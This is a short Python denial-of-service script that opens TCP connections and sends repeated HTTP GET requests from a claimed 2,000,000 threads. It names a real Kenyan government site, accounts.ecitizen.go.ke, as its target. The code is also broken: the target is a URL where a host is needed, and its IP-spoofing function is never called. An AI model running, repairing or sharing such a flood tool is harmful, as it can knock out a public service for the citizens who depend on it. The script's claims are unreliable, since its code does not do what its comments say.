import socket
import threading
import random

# Target Information
target_ip = 'https://accounts.ecitizen.go.ke/en'  # Replace with target IP or domain
target_port = 80  # Target port (HTTP)
threads = 2000000 # Number of threads to use in the attack


# Spoofed IP Address Generation
def spoof_ip():
    ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
    return ip


# Attack function using a standard TCP socket
def attack():
    while True:
        try:
            # Create a TCP socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target_ip, target_port))

            # Send fake GET requests
            request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n"
            s.send(request.encode('ascii'))
            s.close()
        except socket.error as e:
            print(f"Socket error: {e}")
            break


# Starting the attack with multiple threads
for i in range(threads):
    thread = threading.Thread(target=attack)
    thread.start()

print(f"Attacking {target_ip} on port {target_port} with {threads} threads.")
